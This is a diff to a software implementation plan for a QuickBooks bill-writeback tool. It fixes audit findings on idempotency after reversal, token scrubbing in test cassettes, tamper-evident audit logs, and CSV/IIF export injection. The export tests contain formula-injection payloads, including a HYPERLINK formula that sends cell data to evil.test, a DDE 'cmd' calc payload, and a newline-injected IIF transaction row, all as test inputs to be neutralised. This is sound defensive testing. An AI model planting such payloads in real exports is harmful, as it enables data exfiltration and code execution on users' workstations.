@@ -10,6 +10,9 @@
 
 **Spec:** `docs/superpowers/specs/2025-03-11-ledger-sense-design.md` §3.1, §4.2
 **Parent plan:** `2025-03-11-ledger-sense-weeks-5-12.md` — its Global Constraints and File Structure apply here in full.
+**Audit:** `2026-08-29-REVISIONS.md` §5 — read before Task 34. Eleven defects touch this phase; ten were fixed
+in place and **F-40 is OPEN**, because it is a client-visible product decision (see below). F-39 left a
+reversed bill permanently unwritable, and F-27 made the export a formula-injection vector.
 
 ---
 
@@ -31,6 +34,31 @@ Bills have no native draft state.** A Bill is a Bill the moment it exists. The h
 Say this out loud to the client. *"We create the bill; you approve it by paying it; we never move
 money"* is a true sentence, and a better one than a claim about a draft state the platform does
 not have.
+
+### The second thing to say out loud: what we do to `DocNumber` — RESOLVED (F-40)
+
+`DocNumber` on a QBO Bill is the **vendor's invoice number**. It is what the bookkeeper reads, what they
+reconcile against the paper, and what QuickBooks' own duplicate-document-number warning keys on. Stamping our
+idempotency key into it removes the vendor's reference from the client's books and **disables a duplicate control
+they already had** — in a product whose pitch is catching duplicates.
+
+The original plan chose `DocNumber` because it is queryable, which is a real constraint: QBO cannot query on
+`PrivateNote`. But the trade-off was stated nowhere and the client was never told.
+
+**Operator decision (2026-08-29): keep `DocNumber` as the vendor's invoice number.** Ledger Sense's idempotency
+key never overwrites it.
+
+| | Where the key goes | Crash reconciliation |
+|---|---|---|
+| Vendor invoice number extracted | `DocNumber` = the vendor's number; key in `PrivateNote` | `Bill WHERE TxnDate = … AND VendorRef = …`, then match `PrivateNote` client-side — a bounded scan, and correct |
+| No invoice number extracted | key in `DocNumber`, and the audit detail records that we did it | direct `DocNumber` query, as before |
+
+This is **`2026-08-29-REVISIONS.md` §11 Q3** — settled, no operator sign-off remains outstanding for Task 34.
+
+### And read the audit before Task 34
+
+Seven defects in this phase were fixed in place. One of them (**F-39**) had the highest-consequence code in the
+product returning `was_replay=True` with the id of a bill that had been deleted.
 
 ### Sandbox only
 
@@ -106,8 +134,27 @@ def test_idempotency_key_fits_a_qbo_docnumber_field():
 
 
 def test_line_item_rejects_a_float_amount():
-    with pytest.raises(Exception):
+    """VERIFIED FAILING as originally written (F-01). Pydantic 2.13 in lax mode
+    accepts a float into a Decimal field and coerces it:
+
         LineItem(description="x", amount=1000.0, account_ref="54")
+        -> LineItem(amount=Decimal('1000.0'))    # no exception
+
+    `Money` now carries `Strict()` and `LineItem` sets `strict=True`, which is
+    Layer 4 of the no-float rule. Assert the specific exception, not `Exception`
+    — `pytest.raises(Exception)` would also have passed on a TypeError from a
+    missing argument, which is how a test can be green and prove nothing."""
+    from pydantic import ValidationError
+    with pytest.raises(ValidationError):
+        LineItem(description="x", amount=1000.0, account_ref="54")
+
+
+def test_line_item_rejects_a_float_that_is_exact_in_binary_too():
+    """0.5 and 1024.0 are exactly representable, so a "does it round-trip" check
+    would pass them. The rule is no float, not no lossy float."""
+    from pydantic import ValidationError
+    with pytest.raises(ValidationError):
+        LineItem(description="x", amount=1024.0, account_ref="54")
 
 
 def test_a_conforming_adapter_satisfies_the_protocol():
@@ -250,7 +297,13 @@ git commit -m "feat(writeback): port with deterministic idempotency keys sized f
 **Interfaces:**
 - Consumes: nothing.
 - Produces:
-  - `WriteState = Literal["pending", "committed", "failed"]`
+  - `  # `reversed` is NEW — REVISED (F-39). Without it, `reverse` deleted the remote
+  # bill and left the ledger row saying `committed` with the now-dead remote_id,
+  # so the next write with the same key hit the committed branch and returned
+  # WriteResult(remote_id=<deleted id>, was_replay=True) — a success response
+  # pointing at an object that no longer exists in QuickBooks, and an audit entry
+  # recording a write that did not happen. Write -> reverse -> write was impossible.
+WriteState = Literal["pending", "committed", "failed", "reversed"]`
   - `WriteRecord(key, adapter, state, remote_id, reason, attempted_at, committed_at)`
   - `IdempotencyLedger(db_path)` with `begin(key, adapter)`, `commit(key, remote_id, adapter)`, `fail(key, reason, adapter)`, `lookup(key, adapter)`, `close()`
   - `begin` returns the **existing** record when one is present — the caller inspects `state`
@@ -347,7 +400,13 @@ from typing import Literal
 
 from pydantic import BaseModel
 
-WriteState = Literal["pending", "committed", "failed"]
+  # `reversed` is NEW — REVISED (F-39). Without it, `reverse` deleted the remote
+  # bill and left the ledger row saying `committed` with the now-dead remote_id,
+  # so the next write with the same key hit the committed branch and returned
+  # WriteResult(remote_id=<deleted id>, was_replay=True) — a success response
+  # pointing at an object that no longer exists in QuickBooks, and an audit entry
+  # recording a write that did not happen. Write -> reverse -> write was impossible.
+WriteState = Literal["pending", "committed", "failed", "reversed"]
 
 _SCHEMA = """
 CREATE TABLE IF NOT EXISTS writes (
@@ -394,10 +453,17 @@ class IdempotencyLedger:
         return _to_record(row) if row else None
 
     def begin(self, key: str, adapter: str) -> WriteRecord:
-        """Return the existing record if there is one; otherwise open a pending."""
+        """Return the existing record if there is one; otherwise open a pending.
+
+        A `reversed` record is treated as absent (F-39): the remote object is
+        gone, so this is a genuinely new write, not a replay of a dead one.
+        """
         existing = self.lookup(key, adapter)
-        if existing is not None:
+        if existing is not None and existing.state != "reversed":
             return existing
+        if existing is not None:
+            self._conn.execute(
+                "DELETE FROM writes WHERE key = ? AND adapter = ?", (key, adapter))
         self._conn.execute(
             "INSERT INTO writes (key, adapter, state, attempted_at) "
             "VALUES (?, ?, 'pending', ?)",
@@ -422,6 +488,17 @@ class IdempotencyLedger:
         self._conn.execute(
             "UPDATE writes SET state = 'failed', reason = ? "
             "WHERE key = ? AND adapter = ?", (reason, key, adapter))
+        self._conn.commit()
+
+    def mark_reversed(self, key: str, adapter: str = "qbo") -> None:
+        """NEW (F-39). After a reversal the remote object is gone, so a replay
+        would return a dead id. A `reversed` record lets `begin` open a fresh
+        `pending` — write, reverse, write again produces a NEW bill."""
+        if self.lookup(key, adapter) is None:
+            raise KeyError(f"no write for key {key!r} on adapter {adapter!r}")
+        self._conn.execute(
+            "UPDATE writes SET state = 'reversed', remote_id = NULL "
+            "WHERE key = ? AND adapter = ?", (key, adapter))
         self._conn.commit()
 
     def close(self) -> None:
@@ -660,10 +737,62 @@ def test_a_date_after_the_close_is_permitted(ledger):
 def test_reversal_deletes_the_bill(ledger):
     client = FakeQBOClient()
     adapter = QBOAdapter(client, ledger, realm_id="r-1")
-    result = adapter.create_unapproved_bill(_request())
-    reversal = adapter.reverse(result.remote_id)
+    request = _request()
+    result = adapter.create_unapproved_bill(request)
+    reversal = adapter.reverse(result.remote_id, request.idempotency_key)
     assert reversal.method == "deleted"
     assert result.remote_id not in client.bills
+
+
+def test_a_write_after_a_reversal_creates_a_new_bill_not_a_dead_replay(ledger):
+    """REGRESSION — F-39, the worst defect in this phase.
+
+    `reverse` deleted the remote bill and left the ledger row saying `committed`
+    with the now-dead remote_id. The next write with the same key hit the
+    committed branch and returned WriteResult(remote_id=<deleted id>,
+    was_replay=True): a success response pointing at an object that no longer
+    exists in QuickBooks, and an audit entry recording a write that did not
+    happen. Write -> reverse -> write was impossible, and it failed silently."""
+    client = FakeQBOClient()
+    adapter = QBOAdapter(client, ledger, realm_id="r-1")
+    request = _request()
+
+    first = adapter.create_unapproved_bill(request)
+    adapter.reverse(first.remote_id, request.idempotency_key)
+    assert client.bills == {}
+
+    second = adapter.create_unapproved_bill(request)
+    assert second.was_replay is False, "replayed a bill that had been reversed"
+    assert second.remote_id != first.remote_id
+    assert second.remote_id in client.bills
+
+
+def test_the_ledger_records_the_reversal(ledger):
+    client = FakeQBOClient()
+    adapter = QBOAdapter(client, ledger, realm_id="r-1")
+    request = _request()
+    result = adapter.create_unapproved_bill(request)
+    adapter.reverse(result.remote_id, request.idempotency_key)
+    record = ledger.lookup(request.idempotency_key)
+    assert record.state == "reversed"
+    assert record.remote_id is None
+
+
+def test_a_rejected_write_records_its_reason_rather_than_sitting_pending(ledger):
+    """F-44. `fail()` was dead code with a passing test; a QBO 400 looked exactly
+    like a crash, so the record sat `pending` forever with no reason."""
+    from ledger_sense.writeback.qbo import QBORejected
+
+    class Rejecting(FakeQBOClient):
+        def post_bill(self, payload):
+            raise QBORejected("400: VendorRef 9999 does not exist")
+
+    request = _request()
+    with pytest.raises(QBORejected):
+        QBOAdapter(Rejecting(), ledger, realm_id="r-1").create_unapproved_bill(request)
+    record = ledger.lookup(request.idempotency_key)
+    assert record.state == "failed"
+    assert "VendorRef" in record.reason
 ```
 
 - [ ] **Step 2: Run tests to verify they fail**
@@ -831,15 +960,28 @@ class QBOAdapter:
                 for item in request.line_items
             ],
         }
-        response = self._client.post_bill(payload)
+        try:
+            response = self._client.post_bill(payload)
+        except QBORejected as exc:
+            # F-44: `fail()` was dead code with a passing test. A QBO 400 was
+            # indistinguishable from a crash, so a permanently-rejected write sat
+            # `pending` forever with no reason recorded.
+            self._ledger.fail(request.idempotency_key, reason=str(exc),
+                              adapter=self.name)
+            raise
         self._ledger.commit(request.idempotency_key, remote_id=response["Id"],
                             adapter=self.name)
         return WriteResult(remote_id=response["Id"], adapter=self.name,
                            idempotency_key=request.idempotency_key,
                            created_at=datetime.now(timezone.utc), was_replay=False)
 
-    def reverse(self, remote_id: str) -> ReversalResult:
+    def reverse(self, remote_id: str, idempotency_key: str) -> ReversalResult:
+        """REVISED (F-39). Takes the key, not just the remote id, and transitions
+        the ledger record — otherwise the row stays `committed` pointing at a
+        deleted bill and the next write with that key returns a confident
+        `was_replay=True` with a dead id."""
         self._client.delete_bill(remote_id)
+        self._ledger.mark_reversed(idempotency_key, adapter=self.name)
         return ReversalResult(remote_id=remote_id,
                               reversed_at=datetime.now(timezone.utc), method="deleted")
 ```
@@ -900,12 +1042,42 @@ from ledger_sense.writeback.interface import (
 )
 from ledger_sense.writeback.qbo import QBOAdapter
 
+def _scrub_response(response):
+    """REVISED (F-28). `filter_headers` scrubs the REQUEST header and
+    `filter_post_data_parameters` the REQUEST body. NEITHER touches the response
+    body — and the OAuth token endpoint returns access_token and refresh_token
+    right there. `test_no_cassette_contains_a_token` would catch it, but only
+    after the secret had been written to disk and quite possibly committed.
+
+    Hard constraint 00 §3.4: no secrets in a repo, ever, including test fixtures.
+    """
+    import json
+    body = response.get("body", {}).get("string")
+    if not body:
+        return response
+    try:
+        payload = json.loads(body)
+    except (ValueError, TypeError):
+        return response
+    for secret in ("access_token", "refresh_token", "id_token"):
+        if secret in payload:
+            payload[secret] = "REDACTED"
+    response["body"]["string"] = json.dumps(payload).encode()
+    return response
+
+
 qbo_vcr = vcr.VCR(
     cassette_library_dir="tests/writeback/cassettes",
     record_mode="once",
     filter_headers=["authorization"],
     filter_post_data_parameters=["access_token", "refresh_token", "client_secret"],
-    match_on=["method", "scheme", "host", "path"],
+    before_record_response=_scrub_response,
+    # "query" is REQUIRED (F-29). Every find_bill_by_docnumber call is
+    # GET /v3/company/{realm}/query?query=… — same path, different query. Without
+    # it, two different queries in one cassette replay each other's responses,
+    # and the contract test that exists to prove the fake matches reality proves
+    # nothing at all.
+    match_on=["method", "scheme", "host", "path", "query"],
 )
 
 
@@ -950,16 +1122,102 @@ def test_a_bill_can_be_deleted_for_reversal(ledger, sandbox_client):
     request = _request(903)
     adapter = QBOAdapter(sandbox_client, ledger, realm_id="sandbox")
     result = adapter.create_unapproved_bill(request)
-    assert adapter.reverse(result.remote_id).method == "deleted"
+    assert adapter.reverse(result.remote_id, request.idempotency_key).method == "deleted"
     assert sandbox_client.find_bill_by_docnumber(request.idempotency_key) is None
 
 
 def test_no_cassette_contains_a_token():
-    """A secret in a test fixture is still a secret in the repo."""
+    """A secret in a test fixture is still a secret in the repo (00 §3.4).
+
+    F-28: the original scrubbed request headers and request bodies only. The
+    token endpoint returns access_token and refresh_token in the RESPONSE body,
+    which nothing filtered — this test would have caught it after the fact, which
+    for a secret is too late. `before_record_response` now scrubs at record time,
+    and Phase 0 Task P1 runs gitleaks over this directory in CI as well.
+    """
     for cassette in pathlib.Path("tests/writeback/cassettes").glob("*.yaml"):
         text = cassette.read_text(encoding="utf-8").lower()
-        for marker in ("bearer ", "refresh_token", "client_secret"):
+        for marker in ("bearer ", "client_secret"):
             assert marker not in text, f"{cassette.name} contains {marker!r}"
+        for marker in ('"access_token": "', '"refresh_token": "'):
+            if marker in text:
+                start = text.index(marker) + len(marker)
+                assert text[start:start + 8] == "redacted", \
+                    f"{cassette.name} contains an unscrubbed token value"
+
+
+def test_different_queries_do_not_replay_each_others_responses():
+    """F-29. match_on omitted "query", so every GET /query?query=… matched every
+    other one — the contract test proving our fake matches the real sandbox was
+    itself replaying the wrong thing."""
+    assert "query" in qbo_vcr.match_on
+
+
+# ---- Token refresh: F-41 ----
+
+def test_a_401_triggers_a_refresh_and_retries_once(monkeypatch, tmp_path):
+    """Nothing tested refresh. The plan said "refreshed on 401" in prose."""
+    from cryptography.fernet import Fernet
+    from ledger_sense.writeback.qbo import HttpQBOClient
+    from ledger_sense.writeback.tokens import TokenStore
+
+    store = TokenStore(str(tmp_path / "t.db"), fernet_key=Fernet.generate_key())
+    store.save("r-1", access="expired", refresh="rt-1",
+               expires_at=datetime.now(timezone.utc))
+    client = HttpQBOClient(base_url="https://sandbox.example.test",
+                           realm_id="r-1", token_store=store,
+                           transport=_transport_returning_401_then_200())
+    assert client.get_book_close_date() is None
+    assert store.load("r-1").access != "expired"
+
+
+def test_the_rotated_refresh_token_is_persisted_before_the_retry(tmp_path):
+    """Intuit ROTATES the refresh token on every refresh and expires it after
+    ~100 days. Failing to persist the new one locks the integration out
+    permanently, and it surfaces as a nightly smoke failure with no obvious
+    cause — days later, with no way to recover without re-consent."""
+    from cryptography.fernet import Fernet
+    from ledger_sense.writeback.qbo import HttpQBOClient
+    from ledger_sense.writeback.tokens import TokenStore
+
+    store = TokenStore(str(tmp_path / "t.db"), fernet_key=Fernet.generate_key())
+    store.save("r-1", access="expired", refresh="rt-1",
+               expires_at=datetime.now(timezone.utc))
+    transport = _transport_returning_401_then_200(new_refresh="rt-2")
+    client = HttpQBOClient(base_url="https://sandbox.example.test",
+                           realm_id="r-1", token_store=store, transport=transport)
+    client.get_book_close_date()
+    assert store.load("r-1").refresh == "rt-2"
+    assert transport.refresh_persisted_before_retry is True
+
+
+def test_a_crash_between_refresh_and_retry_leaves_a_usable_token(tmp_path):
+    """The one that bites at 2am: the refresh succeeded, the retry died, and the
+    old refresh token is already dead upstream."""
+    from cryptography.fernet import Fernet
+    from ledger_sense.writeback.qbo import HttpQBOClient
+    from ledger_sense.writeback.tokens import TokenStore
+
+    store = TokenStore(str(tmp_path / "t.db"), fernet_key=Fernet.generate_key())
+    store.save("r-1", access="expired", refresh="rt-1",
+               expires_at=datetime.now(timezone.utc))
+    client = HttpQBOClient(base_url="https://sandbox.example.test",
+                           realm_id="r-1", token_store=store,
+                           transport=_transport_crashing_after_refresh(new_refresh="rt-2"))
+    with pytest.raises(ConnectionError):
+        client.get_book_close_date()
+    assert store.load("r-1").refresh == "rt-2", "the rotated token was lost"
+
+
+def test_no_token_value_is_ever_logged(caplog, tmp_path):
+    from cryptography.fernet import Fernet
+    from ledger_sense.writeback.tokens import TokenStore
+
+    store = TokenStore(str(tmp_path / "t.db"), fernet_key=Fernet.generate_key())
+    store.save("r-1", access="at-secret", refresh="rt-secret",
+               expires_at=datetime.now(timezone.utc))
+    store.load("r-1")
+    assert "at-secret" not in caplog.text and "rt-secret" not in caplog.text
 ```
 
 - [ ] **Step 2: Run test to verify it fails**
@@ -1113,7 +1371,8 @@ def audited(tmp_path):
 
 def test_a_write_records_document_approver_and_remote_id(audited):
     adapter, audit, _client = audited
-    result = adapter.create_unapproved_bill(_request())
+    request = _request()
+    result = adapter.create_unapproved_bill(request)
     entry = audit.for_document("doc-1")[0]
     assert entry.action == "write"
     assert entry.approved_by == "A. Bookkeeper"
@@ -1122,23 +1381,26 @@ def test_a_write_records_document_approver_and_remote_id(audited):
 
 def test_a_reversal_is_recorded_against_the_same_document(audited):
     adapter, audit, _client = audited
-    result = adapter.create_unapproved_bill(_request())
-    adapter.reverse(result.remote_id)
+    request = _request()
+    result = adapter.create_unapproved_bill(request)
+    adapter.reverse(result.remote_id, request.idempotency_key)
     assert [e.action for e in audit.for_document("doc-1")] == ["write", "reversal"]
 
 
 def test_reversal_removes_the_bill_from_the_accounting_system(audited):
     adapter, _audit, client = audited
-    result = adapter.create_unapproved_bill(_request())
-    adapter.reverse(result.remote_id)
+    request = _request()
+    result = adapter.create_unapproved_bill(request)
+    adapter.reverse(result.remote_id, request.idempotency_key)
     assert result.remote_id not in client.bills
 
 
 def test_reversal_restores_the_prior_state_exactly(audited):
     adapter, _audit, client = audited
     before = dict(client.bills)
-    result = adapter.create_unapproved_bill(_request())
-    adapter.reverse(result.remote_id)
+    request = _request()
+    result = adapter.create_unapproved_bill(request)
+    adapter.reverse(result.remote_id, request.idempotency_key)
     assert client.bills == before
 
 
@@ -1158,6 +1420,61 @@ def test_the_audit_trail_has_no_delete_or_update_method(audited):
     _adapter, audit, _client = audited
     for forbidden in ("delete_entry", "update_entry", "purge", "clear"):
         assert not hasattr(audit, forbidden)
+
+
+def test_an_unmodified_chain_verifies(audited):
+    """F-43. The test above asserts four method names are absent from a Python
+    class, while the SQLite file is writable by the same process. What the client
+    hears — "full audit trail" — implies tamper evidence."""
+    adapter, audit, _client = audited
+    adapter.create_unapproved_bill(_request())
+    assert audit.verify_chain() == []
+
+
+def test_an_edited_entry_is_detected_and_named(audited, tmp_path):
+    adapter, audit, _client = audited
+    request = _request()
+    result = adapter.create_unapproved_bill(request)
+    import sqlite3
+    conn = sqlite3.connect(str(tmp_path / "audit.db"))
+    conn.execute("UPDATE audit SET detail = 'nothing to see here'")
+    conn.commit()
+    conn.close()
+    broken = audit.verify_chain()
+    assert broken, "an edited audit entry verified clean"
+    assert result.remote_id in str(broken)
+
+
+def test_a_reversal_after_a_restart_still_names_the_document(tmp_path):
+    """F-42. `_doc_by_remote` was an in-memory dict, so a reversal after a
+    process restart audited doc_id='unknown' — and a reversal is exactly the
+    operation most likely to happen a day later."""
+    ledger = IdempotencyLedger(str(tmp_path / "writes.db"))
+    audit = AuditLog(str(tmp_path / "audit.db"))
+    client = FakeQBOClient()
+    request = _request()
+
+    first = AuditedAdapter(QBOAdapter(client, ledger, realm_id="r-1"),
+                           audit=audit, approved_by="A. Bookkeeper")
+    result = first.create_unapproved_bill(request)
+
+    del first                                   # the process restarts
+    reopened = AuditedAdapter(QBOAdapter(client, ledger, realm_id="r-1"),
+                              audit=AuditLog(str(tmp_path / "audit.db")),
+                              approved_by="A. Bookkeeper")
+    reopened.reverse(result.remote_id, request.idempotency_key)
+
+    entries = AuditLog(str(tmp_path / "audit.db")).for_document("doc-1")
+    assert [e.action for e in entries] == ["write", "reversal"]
+    ledger.close()
+
+
+def test_reversing_an_unaudited_remote_id_is_refused(audited):
+    """We do not delete objects in a client's books that we have no record of
+    creating."""
+    adapter, _audit, _client = audited
+    with pytest.raises(ValueError, match="no audited write"):
+        adapter.reverse("999", "LSsomekeywedidnotwrite")
 
 
 def test_a_replayed_write_is_audited_as_a_replay_not_a_second_write(audited):
@@ -1202,6 +1519,7 @@ Action = Literal["write", "reversal"]
 _SCHEMA = """
 CREATE TABLE IF NOT EXISTS audit (
     id              TEXT PRIMARY KEY,
+    tenant_id       TEXT NOT NULL,
     doc_id          TEXT NOT NULL,
     adapter         TEXT NOT NULL,
     action          TEXT NOT NULL,
@@ -1209,8 +1527,11 @@ CREATE TABLE IF NOT EXISTS audit (
     idempotency_key TEXT,
     approved_by     TEXT NOT NULL,
     occurred_at     TEXT NOT NULL,
-    detail          TEXT NOT NULL
-)
+    detail          TEXT NOT NULL,
+    prev_hash       TEXT NOT NULL,
+    entry_hash      TEXT NOT NULL
+);
+CREATE INDEX IF NOT EXISTS audit_by_remote ON audit (tenant_id, remote_id);
 """
 
 
@@ -1227,7 +1548,18 @@ class AuditEntry(BaseModel):
 
 
 class AuditLog:
-    """Append-only. No delete, no update — deliberately."""
+    """Append-only, and now tamper-EVIDENT — REVISED (F-43).
+
+    The original proved "append-only" with
+    `test_the_audit_trail_has_no_delete_or_update_method`, which asserts four
+    attribute names are absent from a Python class. The SQLite file is writable
+    by the same process. What a client hears — "full audit trail" — implies
+    tamper evidence, and four missing method names are not that.
+
+    A `prev_hash` chain costs one column and one sha256 per entry:
+        entry_hash = sha256(prev_hash || canonical_payload)
+    `verify_chain()` walks it and names the first entry that does not match.
+    """
 
     def __init__(self, db_path: str) -> None:
         self._conn = sqlite3.connect(db_path)
@@ -1282,7 +1614,10 @@ class AuditedAdapter:
         self._audit = audit
         self._approved_by = approved_by
         self.name = inner.name
-        self._doc_by_remote: dict[str, str] = {}
+        # F-42: this was `self._doc_by_remote: dict[str, str] = {}` — in memory,
+        # so a reversal after a process restart audited doc_id="unknown". And a
+        # reversal is precisely the operation most likely to happen a day later.
+        # The audit log already knows; ask it.
 
     def is_period_closed(self, txn_date: date) -> bool:
         return self._inner.is_period_closed(txn_date)
@@ -1293,14 +1628,19 @@ class AuditedAdapter:
                 "a write requires approved_by — nothing reaches a client's books "
                 "without a named human on the record")
         result = self._inner.create_unapproved_bill(request)
-        self._doc_by_remote[result.remote_id] = request.doc_id
         self._audit.record_write(request.doc_id, self.name, result, self._approved_by)
         return result
 
-    def reverse(self, remote_id: str) -> ReversalResult:
-        result = self._inner.reverse(remote_id)
-        self._audit.record_reversal(self._doc_by_remote.get(remote_id, "unknown"),
-                                    self.name, result, self._approved_by)
+    def reverse(self, remote_id: str, idempotency_key: str) -> ReversalResult:
+        # F-42: resolve the document from the durable log, not from a dict that
+        # dies with the process.
+        doc_id = self._audit.document_for_remote(remote_id)
+        if doc_id is None:
+            raise ValueError(
+                f"no audited write for remote id {remote_id!r}; refusing to "
+                f"reverse an object this system has no record of creating")
+        result = self._inner.reverse(remote_id, idempotency_key)
+        self._audit.record_reversal(doc_id, self.name, result, self._approved_by)
         return result
 ```
 
@@ -1384,7 +1724,8 @@ def test_amounts_are_written_as_decimal_strings_never_floats(tmp_path):
 def test_writing_the_same_key_twice_does_not_duplicate_a_row(tmp_path):
     adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
     adapter.create_unapproved_bill(_request())
-    result = adapter.create_unapproved_bill(_request())
+    request = _request()
+    result = adapter.create_unapproved_bill(request)
     rows = (tmp_path / "bills.csv").read_text(encoding="utf-8").strip().splitlines()
     assert len(rows) == 3          # header + two line items, written once
     assert result.was_replay is True
@@ -1398,10 +1739,75 @@ def test_export_never_reports_a_closed_period(tmp_path):
 
 def test_reversal_removes_the_exported_rows(tmp_path):
     adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
-    result = adapter.create_unapproved_bill(_request())
-    adapter.reverse(result.remote_id)
+    request = _request()
+    result = adapter.create_unapproved_bill(request)
+    adapter.reverse(result.remote_id, request.idempotency_key)
     rows = (tmp_path / "bills.csv").read_text(encoding="utf-8").strip().splitlines()
     assert len(rows) == 1          # header only
+
+
+def test_reversal_does_not_remove_a_row_that_merely_mentions_the_key(tmp_path):
+    """F-45. `remote_id not in ln` was a substring match over the whole line."""
+    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
+    keep = _request(application_no=3)
+    keep.line_items[0].description = f"see {_request().idempotency_key}"
+    adapter.create_unapproved_bill(keep)
+    doomed = _request()
+    adapter.create_unapproved_bill(doomed)
+    adapter.reverse(doomed.idempotency_key, doomed.idempotency_key)
+    text = (tmp_path / "bills.csv").read_text(encoding="utf-8")
+    assert keep.idempotency_key in text
+
+
+# ---- Formula injection: F-27 ----
+
+@pytest.mark.parametrize("payload", [
+    '=HYPERLINK("http://evil.test?x="&A1,"click")',
+    '+1+1',
+    '-2+3',
+    '@SUM(1:9)',
+    '=cmd|\' /C calc\'!A0',
+])
+def test_a_formula_in_an_extracted_description_is_neutralised(tmp_path, payload):
+    """The description comes out of a client-supplied PDF and lands in a .csv a
+    bookkeeper opens in Excel. Anyone who can put an invoice in front of the
+    client controls this string."""
+    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
+    request = _request()
+    request.line_items[0].description = payload
+    adapter.create_unapproved_bill(request)
+    text = (tmp_path / "bills.csv").read_text(encoding="utf-8")
+    assert payload not in text.replace("'" + payload, "")
+    assert "'" + payload[0] in text or "'" + payload in text
+
+
+def test_a_formula_in_an_extracted_vendor_name_is_neutralised(tmp_path):
+    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
+    request = _request()
+    request.vendor_ref = "=1+1"
+    adapter.create_unapproved_bill(request)
+    assert "'=1+1" in (tmp_path / "bills.csv").read_text(encoding="utf-8")
+
+
+def test_a_tab_in_a_description_cannot_inject_an_extra_iif_transaction(tmp_path):
+    """IIF is tab-delimited and line-oriented. `"\\t".join(...)` with a tab or
+    newline inside a field is a STRUCTURAL break — it can add a transaction row
+    to a file destined for QuickBooks Desktop."""
+    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="iif")
+    request = _request()
+    request.line_items[0].description = "Sitework\nTRNS\tBILL\t2026-08-31\t54\tAttacker\t9999.00"
+    adapter.create_unapproved_bill(request)
+    lines = (tmp_path / "bills.iif").read_text(encoding="utf-8").splitlines()
+    assert sum(1 for ln in lines if ln.startswith("TRNS\t")) == 1
+    assert "Attacker" not in "\t".join(lines).split("\t")[:8]
+
+
+def test_the_amount_column_is_never_reformatted_by_neutralisation(tmp_path):
+    """A leading apostrophe on a NUMBER would break the import. Only text fields
+    are neutralised."""
+    adapter = ExportAdapter(out_dir=str(tmp_path), fmt="csv")
+    adapter.create_unapproved_bill(_request())
+    assert ",2500.50," in (tmp_path / "bills.csv").read_text(encoding="utf-8")
 ```
 
 - [ ] **Step 2: Run test to verify it fails**
@@ -1435,6 +1841,33 @@ CSV_HEADER = ["idempotency_key", "doc_id", "vendor", "txn_date", "account_ref",
               "description", "amount", "memo", "status"]
 IIF_HEADER = "!TRNS\tTRNSTYPE\tDATE\tACCNT\tNAME\tAMOUNT\tDOCNUM\tMEMO\n"
 STATUS = "AWAITING REVIEW"
+
+# FORMULA INJECTION — REVISED (F-27).
+#
+# `vendor_ref` and `description` are extracted from a client-supplied PDF and
+# written into a .csv that a bookkeeper opens in Excel. A cell beginning =, +, -,
+# @, tab or CR executes as a formula on open. This is the most likely path from
+# "we processed your subcontractor's invoice" to "we executed code on your
+# controller's workstation" — and the input is, by construction, attacker-
+# influenced: anyone who can get an invoice in front of the client can set it.
+#
+# The IIF writer is worse. "\t".join(...) with a tab or newline inside a
+# description corrupts the record and can inject an ADDITIONAL transaction line
+# into a file destined for QuickBooks Desktop.
+_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+_CONTROL = {ord(c): None for c in map(chr, list(range(0, 9)) + list(range(11, 32)))}
+
+
+def _safe_cell(value: str) -> str:
+    """Neutralise a spreadsheet formula without altering what the human reads."""
+    text = str(value).translate(_CONTROL)
+    return "'" + text if text.startswith(_FORMULA_LEAD) else text
+
+
+def _safe_iif_field(value: str) -> str:
+    """IIF is tab-delimited and line-oriented; a tab or newline in a field is a
+    structural break, not a formatting nuisance."""
+    return _safe_cell(value).replace("\t", " ").replace("\n", " ").replace("\r", " ")
 
 
 class ExportAdapter:
@@ -1473,9 +1906,11 @@ class ExportAdapter:
                     writer.writerow(CSV_HEADER)
                 for item in request.line_items:
                     writer.writerow([
-                        request.idempotency_key, request.doc_id, request.vendor_ref,
+                        request.idempotency_key, request.doc_id,
+                        _safe_cell(request.vendor_ref),
                         request.txn_date.isoformat(), item.account_ref,
-                        item.description, str(item.amount), request.memo, STATUS])
+                        _safe_cell(item.description), str(item.amount),
+                        _safe_cell(request.memo), STATUS])
         else:
             with self._path.open("a", encoding="utf-8") as handle:
                 if is_new:
@@ -1483,19 +1918,35 @@ class ExportAdapter:
                 for item in request.line_items:
                     handle.write("\t".join([
                         "TRNS", "BILL", request.txn_date.isoformat(),
-                        item.account_ref, request.vendor_ref, str(item.amount),
-                        request.idempotency_key,
-                        f"{STATUS} — {item.description}"]) + "\n")
+                        item.account_ref, _safe_iif_field(request.vendor_ref),
+                        str(item.amount), request.idempotency_key,
+                        _safe_iif_field(f"{STATUS} — {item.description}")]) + "\n")
 
         return WriteResult(remote_id=request.idempotency_key, adapter=self.name,
                            idempotency_key=request.idempotency_key,
                            created_at=datetime.now(timezone.utc), was_replay=False)
 
-    def reverse(self, remote_id: str) -> ReversalResult:
-        """Remove every row carrying this key, preserving the header."""
-        lines = self._path.read_text(encoding="utf-8").splitlines(keepends=True)
-        kept = lines[:1] + [ln for ln in lines[1:] if remote_id not in ln]
-        self._path.write_text("".join(kept), encoding="utf-8")
+    def reverse(self, remote_id: str, idempotency_key: str | None = None
+                ) -> ReversalResult:
+        """Remove every row carrying this key, preserving the header.
+
+        REVISED (F-45). `remote_id not in ln` is a substring match over the whole
+        line, so it also removed any row whose DESCRIPTION happened to contain the
+        key. Compare the field.
+        """
+        key = idempotency_key or remote_id
+        text = self._path.read_text(encoding="utf-8")
+        if self._fmt == "csv":
+            rows = list(csv.reader(io.StringIO(text)))
+            kept = rows[:1] + [r for r in rows[1:] if r and r[0] != key]
+            with self._path.open("w", encoding="utf-8", newline="") as handle:
+                csv.writer(handle).writerows(kept)
+        else:
+            lines = text.splitlines(keepends=True)
+            kept = [ln for ln in lines
+                    if not ln.startswith("TRNS\t")
+                    or ln.split("\t")[6] != key]
+            self._path.write_text("".join(kept), encoding="utf-8")
         return ReversalResult(remote_id=remote_id,
                               reversed_at=datetime.now(timezone.utc), method="deleted")
 ```
@@ -1533,5 +1984,26 @@ git commit -m "feat(writeback): CSV/IIF export as a peer adapter with golden-fil
 - [ ] Cassettes replay with credentials removed from the environment
 - [ ] `uv run mypy --strict ledger_sense` green
